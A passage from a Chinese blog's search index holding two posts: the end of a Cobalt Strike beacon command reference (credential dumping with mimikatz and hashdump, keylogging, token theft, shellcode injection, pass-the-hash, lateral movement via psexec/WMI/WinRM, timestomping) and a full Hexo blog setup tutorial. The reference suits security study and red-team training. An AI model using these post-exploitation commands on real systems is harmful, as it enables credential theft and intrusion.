在目标上执行程序(无输出)    execute-assembly          在目标上内存中执行本地.NET程序    exit                      终止beacon会话    getprivs                  <span class="hljs-builtin-name">Enable</span><span class="hljs-built_in"> system </span>privileges on current token    getsystem                 尝试获取SYSTEM权限    getuid                    获取用户ID    hashdump                  转储密码哈希值    help                      帮助    inject                    在注入进程生成会话    jobkill                   结束一个后台任务    jobs                      列出后台任务    kerberos_ccache_use       从ccache文件中导入票据应用于此会话    kerberos_ticket_purge     清除当前会话的票据    kerberos_ticket_use       Apply 从ticket文件中导入票据应用于此会话    keylogger                 键盘记录    kill                      结束进程    link                      Connect <span class="hljs-keyword">to</span> a Beacon<span class="hljs-built_in"> peer </span>over a named pipe    logonpasswords            使用mimikatz转储凭据和哈希值    ls                        列出文件    make_token                创建令牌以传递凭据    mimikatz                  运行mimikatz    mkdir                     创建一个目录    mode<span class="hljs-built_in"> dns </span>                 使用DNS A作为通信通道(仅限DNS beacon)    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)    mode http                 使用HTTP作为通信通道    mv                        移动文件    net                       net命令   <span class="hljs-built_in"> note </span>                     备注           portscan                  进行端口扫描    powerpick                 通过Unmanaged PowerShell执行命令    powershell                通过powershell.exe执行命令    powershell-import         导入powershell脚本    ppid                      <span class="hljs-builtin-name">Set</span> parent PID <span class="hljs-keyword">for</span> spawned post-ex jobs    ps                        显示进程列表    psexec                    Use a<span class="hljs-built_in"> service </span><span class="hljs-keyword">to</span> spawn a session on a host    psexec_psh                Use PowerShell <span class="hljs-keyword">to</span> spawn a session on a host    psinject                  在特定进程中执行PowerShell命令    pth                       使用Mimikatz进行传递哈希    pwd                       当前目录位置    reg                       Query the registry    rev2self                  恢复原始令牌    rm                        删除文件或文件夹    rportfwd                  端口转发    <span class="hljs-builtin-name">run</span>                       在目标上执行程序(返回输出)    runas                     以其他用户权限执行程序    runasadmin                在高权限下执行程序    runu                      Execute a program under another PID    screenshot                屏幕截图    setenv                    设置环境变量    shell                     执行cmd命令    shinject                  将shellcode注入进程    shspawn                   启动一个进程并将shellcode注入其中    sleep                     设置睡眠延迟时间   <span class="hljs-built_in"> socks </span>                    启动SOCKS4代理   <span class="hljs-built_in"> socks </span>stop                停止SOCKS4    spawn                     Spawn a session     spawnas                   Spawn a session as another user    spawnto                   <span class="hljs-builtin-name">Set</span> executable <span class="hljs-keyword">to</span> spawn processes into    spawnu                    Spawn a session under another PID    ssh                       使用ssh连接远程主机    ssh-key                   使用密钥连接远程主机    steal_token               从进程中窃取令牌    timestomp                 将一个文件的时间戳应用到另一个文件    unlink                    Disconnect <span class="hljs-keyword">from</span> parent Beacon    upload                    上传文件    wdigest                   使用mimikatz转储明文凭据    winrm                     使用WinRM横向渗透    wmi                       使用WMI横向渗透</code></pre><h2 id="监听器介绍"><a href="#监听器介绍" class="headerlink" title="监听器介绍"></a>监听器介绍</h2><p>待更新</p>]]></content>
    
    
    <categories>
      
      <category>安全工具</category>
      
      <category>后渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
      <tag>工具</tag>
      
      <tag>后渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo安装教程</title>
    <link href="/2020/07/26/install-hexo/"/>
    <url>/2020/07/26/install-hexo/</url>
    
    <content type="html"><![CDATA[<h1 id="Hexo安装教程"><a href="#Hexo安装教程" class="headerlink" title="Hexo安装教程"></a>Hexo安装教程</h1><h3 id="hexo简介"><a href="#hexo简介" class="headerlink" title="hexo简介"></a>hexo简介</h3><p>Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Coding上，是搭建博客的首选框架。大家可以进入<a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">hexo官网</a>进行详细查看，因为Hexo的创建者是台湾人，对中文的支持很友好，可以选择中文进行查看。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h3><p><strong>Windows</strong>：到git官网上下载<a href="https://gitforwindows.org/" target="_blank" rel="noopener">Download git</a>下载后会有一个Git Bash的命令行工具，以后就用这个工具来使用git。</p><p><strong>Linux</strong>：对linux来说实在是太简单了，因为最早的git就是在linux上编写的，只需要一行代码</p><pre><code class="hljs shell">sudo apt-get install gitsudo yum install git</code></pre><p>安装好后，用<code>git --version</code> 来查看一下版本</p><h3 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h3><p>Hexo是基于nodeJS编写的，所以需要安装一下nodeJs和里面的npm工具。</p><p><strong>Windows</strong>：<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">nodejs</a>选择LTS版本就行了</p><p><strong>Linux</strong>：</p><pre><code class="hljs shell">sudo apt-get install nodejssudo apt-get install npm</code></pre><p>安装完后，打开命令行</p><pre><code class="hljs shell">node -vnpm -v</code></pre><p>检查一下有没有安装成功</p><p>顺便说一下，windows在git安装完后，就可以直接使用git bash来敲命令行了，不用自带的cmd，cmd有点难用。</p><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><p>前面git和nodejs安装好后，就可以安装hexo了，你可以先创建一个文件夹blog，然后<code>cd</code>到这个文件夹下（或者在这个文件夹下直接右键git bash打开）</p><pre><code class="hljs shell">npm install -g hexo-cli</code></pre><p>依旧用<code>hexo -v</code>查看一下版本</p><p>至此就全部安装完了。</p><p>接下来初始化一下hexo</p><pre><code class="hljs shell">hexo init myblog</code></pre><p>这个myblog可以自己取什么名字都行，然后</p><pre><code class="hljs shell">cd myblog //进入这个myblog文件夹npm install</code></pre><p>新建完成后，指定文件夹目录下有:</p><pre><code class="hljs bash">.├── _config.yml<span class="hljs-comment">#网站的 配置 信息，您可以在此配置大部分的参数。</span>├── package.json<span class="hljs-comment">#应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，您可以自由移除</span>├── scaffolds<span class="hljs-comment">#模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。</span>├── <span class="hljs-built_in">source</span><span class="hljs-comment">#资源文件夹是存放用户资源的地方。</span>|   ├── _drafts<span class="hljs-comment">#草稿</span>|   └── _posts<span class="hljs-comment">#文章</span>└── themes<span class="hljs-comment">#主题 文件夹。Hexo 会根据主题来生成静态页面。</span></code></pre><pre><code class="hljs asciidoc">hexo generate  #生产静态文件hexo server#开启web服务====其它命令hexo deploy#部署网站hexo clean#清除缓存文件 (db.json) 和已生成的静态文件 (public)hexo list &lt;type&gt;#列出网站资料</code></pre><p>打开hexo的服务，在浏览器输入localhost:4000就可以看到你生成的博客了。</p><h2 id="上传Github并且替换个人域名"><a href="#上传Github并且替换个人域名" class="headerlink" title="上传Github并且替换个人域名"></a>上传Github并且替换个人域名</h2><p>创建一个和你用户名相同的仓库，后面加.github.io，只有这样，将来要部署到GitHub page的时候，才会被识别，也就是xxxx.github.io，其中xxx就是你注册GitHub的用户名</p><h3 id="生成SSH添加Github"><a href="#生成SSH添加Github" class="headerlink" title="生成SSH添加Github"></a>生成SSH添加Github</h3><p>回到git bash</p><pre><code class="hljs routeros">git<span class="hljs-built_in"> config </span>--global user.name <span class="hljs-string">"yourname"</span>git<span class="hljs-built_in"> config </span>--global user.email <span class="hljs-string">"youremail"</span></code></pre><p>这里的yourname输入你的GitHub用户名，youremail输入你GitHub的邮箱。这样GitHub才能知道你是不是对应它的账户。可以用以下两条，检查一下你有没有输对</p><pre><code class="hljs routeros">git<span class="hljs-built_in"> config </span>user.namegit<span class="hljs-built_in"> config </span>user.email</code></pre><p>然后创建SSH一路回车</p><pre><code class="hljs excel">ssh-keygen -<span class="hljs-built_in">t</span> rsa -C <span class="hljs-string">"xxx@xx.com"</span></code></pre><p>ssh，简单来讲，就是一个秘钥，其中，id_rsa是你这台电脑的私人秘钥，不能给别人看的，id_rsa.pub是公共秘钥，可以随便给别人看。把这个公钥放在GitHub上，这样当你链接GitHub自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到GitHub上。</p><p>而后在GitHub的setting中，找到Deploy keys的设置选项，点击Add deploy key 把你的id_rsa.pub里面的信息复制进去。</p><p>在gitbash中，查看是否成功</p><pre><code class="hljs shell">ssh -T git@github.com</code></pre><h3 id="将hexo部署到Github"><a href="#将hexo部署到Github" class="headerlink" title="将hexo部署到Github"></a>将hexo部署到Github</h3><p>将hexo生成的文章部署到GitHub上，打开站点配置文件 <code>_config.yml</code>，翻到最后，修改为你的GitHub账户</p><pre><code class="hljs less"><span class="hljs-attribute">deploy</span>:  <span class="hljs-attribute">type</span>: git  <span class="hljs-attribute">repo</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//github.com/xxx/xxx.github.io.git</span>  <span class="hljs-attribute">branch</span>: master</code></pre><p>这个时候需要先安装deploy-git ，也就是部署的命令,这样你才能用命令部署到GitHub。</p><pre><code class="hljs shell">npm install hexo-deployer-git --save</code></pre><p>然后</p><pre><code class="hljs verilog">hexo cleanhexo <span class="hljs-keyword">generate</span>hexo deploy</code></pre><p>过一会儿就可以在<a href="http://xxx.github.io这个网站看到你的博客了！！" target="_blank" rel="noopener">http://xxx.github.io这个网站看到你的博客了！！</a></p><h3 id="设置个人域名"><a href="#设置个人域名" class="headerlink" title="设置个人域名"></a>设置个人域名</h3><p>192.30.252.153 和 192.30.252.154 是GitHub的服务器地址。</p><p>在域名解析记录里面把Github地址填入</p><p>登录GitHub，进入之前创建的仓库，点击settings-Options-Choose a theme 进去随便选一个出来后从 Custom domain，输入你的域名</p><p>然后在你的博客文件source中创建一个名为CNAME文件，不要后缀。写上你的域名</p><p>最后，在gitbash中，输入</p><pre><code class="hljs properties"><span class="hljs-attr">hexo</span> <span class="hljs-string">clean</span><span class="hljs-attr">hexo</span> <span class="hljs-string">g</span><span class="hljs-attr">hexo</span> <span class="hljs-string">d</span></code></pre><h2 id="新的文章"><a href="#新的文章" class="headerlink" title="新的文章"></a>新的文章</h2><pre><code class="hljs gauss">hexo <span class="hljs-keyword">new</span> [layout] &lt;<span class="hljs-built_in">title</span>&gt;</code></pre><p>然后在source/_post中打开markdown文件，就可以开始编辑了。当你写完的时候，再更新</p><pre><code class="hljs properties"><span class="hljs-attr">hexo</span> <span class="hljs-string">clean</span><span class="hljs-attr">hexo</span> <span class="hljs-string">g</span><span class="hljs-attr">hexo</span> <span class="hljs-string">d</span></code></pre><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029" target="_blank" rel="noopener">https://blog.csdn.net/sinat_37781304/article/details/82729029</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    
    <tags>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
